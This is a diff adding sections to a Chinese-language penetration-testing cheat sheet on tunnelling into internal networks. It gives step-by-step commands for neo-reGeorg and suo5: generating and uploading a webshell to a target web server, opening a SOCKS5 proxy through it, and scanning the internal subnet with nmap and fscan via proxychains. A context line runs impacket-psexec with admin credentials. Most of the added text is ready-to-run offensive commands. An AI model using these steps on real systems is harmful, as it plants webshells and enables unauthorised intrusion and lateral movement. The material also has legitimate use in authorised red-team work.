@@ -97,3 +97,35 @@ proxychains impacket-psexec DOMAIN/admin:pass@10.0.0.1
 ```
 
 **⚠️ proxychains 只支持 TCP，不支持 ICMP（ping 不可用，nmap 用 `-Pn -sT`）**
+
+## neo-reGeorg — Web 隧道代理
+
+当只有 HTTP/HTTPS 出网（防火墙封锁其他端口）时，通过 Webshell 建立 SOCKS5 隧道：
+
+```bash
+# 生成隧道 Webshell（支持 PHP/ASPX/JSP）
+python3 /pentest/Neo-reGeorg/neoreg.py generate -k PASSWORD
+
+# 上传生成的 tunnel.php 到目标 Web 服务器
+
+# 启动本地 SOCKS5 代理
+python3 /pentest/Neo-reGeorg/neoreg.py -k PASSWORD -u http://TARGET/tunnel.php -p 1080
+
+# 通过代理访问内网
+proxychains nmap -sT -Pn 10.0.0.0/24
+```
+
+## suo5 — HTTP 正向代理隧道
+
+基于 HTTP 的高性能正向代理，比 reGeorg 更快更稳定：
+
+```bash
+# 上传 suo5 服务端（Go 编译的单文件 Webshell，支持 JSP/PHP/ASPX）
+# 服务端文件在 /pentest/suo5/
+
+# 连接（SOCKS5 代理）
+./suo5 -t http://TARGET/suo5.jsp -l 127.0.0.1:1080
+
+# 通过代理访问内网
+proxychains fscan -h 10.0.0.0/24
+```
